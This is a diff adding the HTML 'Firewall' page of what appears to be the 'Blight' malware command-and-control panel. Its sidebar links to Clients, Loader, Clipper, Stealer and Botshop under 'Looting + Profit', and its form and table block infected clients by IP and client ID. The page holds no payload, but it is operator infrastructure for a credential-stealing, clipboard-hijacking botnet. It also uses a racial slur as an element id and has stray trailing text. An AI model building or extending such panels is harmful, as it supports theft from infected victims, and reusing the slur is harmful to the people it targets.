@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blight - Firewall</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div id="overlay"></div>
+    <div class="container">
+        <aside class="sidebar">
+            <div class="logo">
+                <img src="https://i.ibb.co/zVF2SSZ/image-removebg-preview-3.png">
+                <h1 class="work-sans">Blight</h1>
+            </div>
+            <div class="sidebar-list-container">
+                <ul>
+                    <li>
+                        <p class="work-sans-light">
+                            Client Managment
+                        </p>
+                    </li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-user"></i>Clients</a></li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-upload"></i>Loader</a></li>
+                    <li>
+                        <p class="work-sans-light">
+                            Server Managment
+                        </p>
+                    </li>
+                    <li  class="active"><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-ban"></i>Firewall</a></li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-code"></i>Server Logs</a></li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-cog"></i>Settings</a></li>
+                    <li>
+                        <p class="work-sans-light">
+                            Looting + Profit
+                        </p>
+                    </li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-clipboard"></i>Clipper</a>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-mask"></i>Stealer</a></li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-robot"></i>Botshop</a></li>
+
+                </ul>
+            </div>
+        </aside>
+        <main class="content">
+
+            <div class="forms">
+
+                <button onclick="openLightbox(0)" class="loadCreationButton">
+                    <i class="fa-solid fa-wand-magic-sparkles"></i>
+                    New Firewall Rule
+                </button>
+
+            </div>
+
+            <div id="lightboxesContainer">
+
+                <div class="lightbox">
+                    <div class="forms">
+                        <div class="form-container">
+                            <button class="close-bttn" onclick="closeLightbox()">
+                                <i class="fa-solid fa-angle-down"></i>
+                            </button>
+                            <h1 class="work-sans-light">New Firewall Rule</h1>
+                            <hr>
+                            <form action="#" method="post">
+                
+                                <label for="message">Block Time</label>
+                                <input type="number" placeholder="Leave blank to block forever">
+
+                                <label for="message">Block Reason</label>
+                                <input type="text">
+
+                                <label for="message">Client IDs</label>
+                                <textarea placeholder="efb883a2d8f14f74"></textarea>
+
+                                <label for="message">IP Addresses</label>
+                                <textarea placeholder="127.0.0.1"></textarea>
+
+                                <input id="nigga" type="submit" value="Submit">
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>IP Address</th>
+                        <th>Client ID</th>
+                        <th>Time Left</th>
+                        <th>Reason</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>127.0.0.1</td>
+                        <td>efb883a2d8f14f74</td>
+                        <td>13m</td>
+                        <td>Sent request with incorrect encryption key.</td>
+                        <td>
+                            <button class="allow-button "><i class="fa-solid fa-door-open"></i> Allow</button>
+                            <button class="remove-button "><i class="fa-solid fa-door-closed"></i> Block Forever</button>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+
+
+        </main>
+
+    </div>
+    <script>
+        var lightboxesContainer = document.getElementById("lightboxesContainer");
+        var lightboxes = Array.from(lightboxesContainer.getElementsByClassName("lightbox"));
+
+        for (let lightbox of lightboxes) {
+            lightbox.style.opacity = "0";
+            lightbox.style.pointerEvents = 'none';
+            document.getElementById("overlay").style.opacity = "0";
+        }
+
+        function openLightbox(index) {
+            lightboxes[index].style.opacity = "1";
+            lightboxes[index].style.pointerEvents = 'auto';
+            document.getElementById("overlay").style.opacity = ".7";
+        }
+
+        function closeLightbox() {
+            for (let lightbox of lightboxes) {
+                lightbox.style.opacity = "0";
+                lightbox.style.pointerEvents = 'none';
+                document.getElementById("overlay").style.opacity = "0";
+            }
+        }
+    </script>
+</body>
+
+</html>Lua ExecutionLua Execution
